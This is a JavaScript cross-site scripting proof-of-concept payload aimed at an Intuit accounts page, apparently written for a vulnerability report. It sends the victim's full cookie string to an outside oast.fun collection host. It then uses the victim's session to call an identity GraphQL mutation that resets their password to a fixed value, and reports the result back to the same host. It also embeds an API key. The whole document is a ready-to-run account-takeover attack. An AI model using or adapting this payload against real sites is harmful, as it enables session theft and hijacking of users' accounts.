(async function(){
var O='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun';

function gc(n){
var m=document.cookie.match(new RegExp('(?:^|;\\s*)'+n.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+'=([^;]*)'));
return m?decodeURIComponent(m[1]):''
}
function uid(){
return'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){
var r=Math.random()*16|0;return(c==='x'?r:(r&0x3|0x8)).toString(16)
})
}

var sid=gc('ius_session');
var userId=gc('userIdentifier');
var vid=gc('ivid');

(new Image).src=O+'/xss-cookies?c='+encodeURIComponent(document.cookie);

try{
var r=await fetch('https://accounts.intuit.com/identity-api/v2/graphql',{
method:'POST',
credentials:'include',
headers:{
'Content-Type':'application/json',
'Authorization':'Intuit_APIKey intuit_apikey=prdakyresHrPbNYmoGmqMbZzZslfhGPRbBpwMfzE, intuit_apikey_version=1.0',
'intuit_offeringid':'Intuit.cto.iam.ius',
'intuit_intentassetalias':'Intuit.cto.iam.ius',
'intuit_sessionid':sid,
'intuit_profilingid':sid,
'intuit_routingid':userId,
'intuit_visitorid':vid,
'intuit_flowid':uid(),
'intuit_tid':uid()
},
body:JSON.stringify({
query:'mutation ReplacePassword($input:Identity_CreateOrReplacePasswordCredentialInput!){identityCreateOrReplacePasswordCredential(input:$input){__typename ...on Identity_CreateOrReplacePasswordCredentialSuccess{status}...on Identity_CredentialUnauthorizedError{message}...on Identity_CredentialInvalidInputError{message}...on Identity_DigitalIdentityLockedOutError{message}}}',
variables:{input:{newPassword:'Poc@2027'}},
operationName:'ReplacePassword'
})
});

var d=await r.json();
var success=d.data&&d.data.identityCreateOrReplacePasswordCredential&&d.data.identityCreateOrReplacePasswordCredential.__typename==='Identity_CreateOrReplacePasswordCredentialSuccess';

(new Image).src=O+'/xss-pwd-result?success='+success+'&r='+encodeURIComponent(JSON.stringify(d));

var color=success?'#0f0':'#f00';
document.body.innerHTML='<div style="font:14px monospace;background:#0a0a0a;color:#eee;padding:30px;min-height:100vh">'
+'<div style="background:'+(success?'#001a00':'#1a0000')+';border:2px solid '+color+';padding:20px;border-radius:8px;margin-bottom:20px">'
+'<h1 style="color:'+color+';margin:0">XSS PoC — '+(success?'PASSWORD CHANGED':'Result')+'</h1></div>'
+'<table style="border-collapse:collapse;font:13px monospace">'
+'<tr><td style="color:#0ff;padding:6px">ius_session</td><td style="color:#ff0;padding:6px">'+sid+'</td></tr>'
+'<tr><td style="color:#0ff;padding:6px">userIdentifier</td><td style="color:#ff0;padding:6px">'+userId+'</td></tr>'
+'<tr><td style="color:#0ff;padding:6px">Password set to</td><td style="color:#f00;padding:6px;font-size:18px"><b>Poc@2027</b></td></tr>'
+'<tr><td style="color:#0ff;padding:6px">API Response</td><td style="color:#ff0;padding:6px;word-break:break-all">'+JSON.stringify(d)+'</td></tr>'
+'</table></div>'

}catch(e){
(new Image).src=O+'/xss-err?e='+encodeURIComponent(e.message);
document.body.innerHTML='<div style="font:14px monospace;background:#111;color:red;padding:30px"><h1>Error</h1><p>'+e.message+'</p><p>session: '+sid+'</p><p>userId: '+userId+'</p></div>'
}
})();
